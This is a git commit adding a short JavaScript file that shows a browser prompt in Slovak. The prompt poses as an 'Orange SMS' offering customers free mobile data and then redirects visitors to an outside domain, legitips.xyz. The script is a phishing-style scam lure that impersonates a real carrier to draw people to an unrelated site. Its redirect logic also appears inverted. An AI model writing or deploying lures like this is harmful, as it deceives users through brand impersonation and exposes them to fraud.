044ecdd87b22ba0eee8cbecb47026e4b6057a8db
legitips <83867893+legitips@users.noreply.github.com>
2024-09-05 02:26:34 -0700

    Create activation-orangefreedata.js

---
+++ activation-orangefreedata.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('ORANŽOVÁ SMS: Vážený zákazník, prosím skontrolujte si, či vaša Orange sim karta spĺňa podmienky na príjem od 5 GB do Neobmedzené dáta, starí zákazníci Odmena, skontrolujte teraz stlačením 1 ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/orangefreedata.html';
+}
